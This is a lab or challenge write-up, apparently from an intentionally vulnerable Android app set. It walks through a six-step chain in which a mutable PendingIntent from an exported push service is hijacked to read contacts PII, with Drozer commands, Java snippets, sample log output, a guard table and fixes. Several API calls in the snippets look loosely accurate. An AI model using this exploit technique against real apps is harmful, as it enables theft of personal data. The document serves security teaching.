# Chain 05 — PendingIntent Hijack to Provider Theft

## Overview

| Field | Value |
|-------|-------|
| **Category** | intent + provider |
| **Difficulty** | INSANE |
| **Steps** | 6 |
| **Components crossed** | PushService → ContactsProvider |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | mutable pending intent → extra mutation → fire under victim uid → provider leak |

## Vulnerable surface

- `PushService` (Messenger, exported) — `MSG_GET_PENDING` (`0x401`) returns a PendingIntent
- Returned PendingIntent carries `FLAG_MUTABLE` and an explicit internal target
- The PendingIntent's `file_uri` extra is caller-mutable, then read back from the victim's
  own provider when fired
- `ContactsProvider` (authority `com.mochat.app.contacts`) — exported, returns full PII cursor
  via the `VIEW_FILE` action

## Step-by-step exploit

### ① Bind exported PushService, send MSG_GET_PENDING

```bash
# Drozer / helper app: bind the Messenger and request the PendingIntent.
dz> run app.service.send com.mochat.app com.mochat.app.push.PushService \
     --msg 0x401 0 0
# reply.replyTo carries back an IBinder; on first reply the service ships a PendingIntent
# in reply.data via KEY_PENDING.
```

### ② Receive a FLAG_MUTABLE PendingIntent with explicit target

```java
PendingIntent pi = reply.getData().getParcelable("pending_intent");
// pi is mutable: getIntent().getExtras() is writable, target is locked to an internal
// component that performs the read.
int flags = pi.getTargetIntent().getFlags();   // FLAG_MUTABLE set
```

### ③ Mutate the 'file_uri' extra to content://com.mochat.app.contacts/contacts

```java
Intent mutated = pi.getCurrentIntent();         // mutable -> caller can edit extras
mutated.putExtra("file_uri", "content://com.mochat.app.contacts/contacts");
mutated.putExtra("action",   "VIEW_FILE");
// Because FLAG_MUTABLE is set, our extra edits stick when the PendingIntent is sent.
```

### ④ Fire the PendingIntent → victim app reads its own provider under granted identity

```java
// Sender side (attacker). Because the PendingIntent's creator is com.mochat.app,
// firing it dispatches the intent as com.mochat.app -> com.mochat.app.
pi.send(context, 0, new PendingIntent.OnFinished() {
    @Override public void onSendCompleted(PendingIntent p, Intent intent, int rc, String result) {
        // result extras contain the cursor payload (ActivityResult / bundle echo)
    }
});
```

### ⑤ The VIEW_FILE action returns the full contacts cursor in the result

Inside the app's component invoked by the PendingIntent:

```java
Uri u = Uri.parse(intent.getStringExtra("file_uri"));
Cursor c = getContentResolver().query(u, null, null, null, null);
// caller identity = com.mochat.app (uid match) -> permission check passes
Bundle out = new Bundle();
out.putParcelable("cursor_data", /* serialized rows */);
setResultData(0, out);          // echoed back to the OnFinished callback
```

### ⑥ Attacker reads PII (id_card, phone, email) from the result extras

```python
# On the attacker side (OnFinished):
rows = result.getBundle("cursor_data")
for r in rows:
    print(r["id_card"], r["phone"], r["email"])
# -> 110101199001011234  13800138000  victim@example.com
```

**logcat confirms**:

```
PushService: handing out PendingIntent target=com.mochat.app/.internal.ViewFileActivity flags=MUTABLE
ViewFileActivity: query content://com.mochat.app.contacts/contacts caller=self uid=10234 rows=42
```

## Guard analysis

| Guard | Status |
|-------|--------|
| PushService caller check | absent (exported, any app binds) |
| PendingIntent mutability | FLAG_MUTABLE granted to untrusted callers |
| Explicit target component | locked, but extras are attacker-writable |
| VIEW_FILE uri validation | absent (trusts caller-supplied file_uri) |
| Cross-caller cursor echo | present (result returned to OnFinished) |
| ContactsProvider permission | absent (exported, self-caller passes) |

## Impact

Any installed app can obtain a `FLAG_MUTABLE` PendingIntent from the victim app, retarget its
`file_uri` extra at the app's own contacts provider, and read the full PII cursor (national IDs,
phone numbers, emails) — all while the provider's identity check passes because the intent is
fired under the victim's UID. A complete identity-theft-grade PII breach with zero on-device
permissions.

## Fix

- Never hand `PendingIntent` objects to untrusted callers. If unavoidable, use
  `FLAG_IMMUTABLE`.
- Do not echo arbitrary caller-supplied extras (like `file_uri`) into a provider query. Build
  URIs from validated, server-side identifiers only.
- `PushService` must verify the caller (signature permission) before returning a PendingIntent.
- `ContactsProvider` must require a custom signature-level read permission; relying on the
  calling uid is insufficient when the call originates from a hijacked PendingIntent.
- Refactor the VIEW_FILE flow so it never returns the cursor to the firing caller.
